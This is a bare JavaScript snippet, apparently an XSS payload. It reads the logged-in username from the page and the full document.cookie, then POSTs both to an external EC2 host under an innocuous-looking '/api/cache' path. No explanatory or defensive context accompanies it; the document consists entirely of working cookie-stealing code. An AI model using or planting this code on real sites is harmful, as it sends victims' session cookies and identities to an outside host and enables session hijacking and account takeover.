var xhr = new XMLHttpRequest();
xhr.open("POST", "http://ec2-18-156-117-154.eu-central-1.compute.amazonaws.com/api/cache", true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
    username: document.getElementsByClassName('usertext mr-1')[0].textContent,
    cookie: document.cookie
}));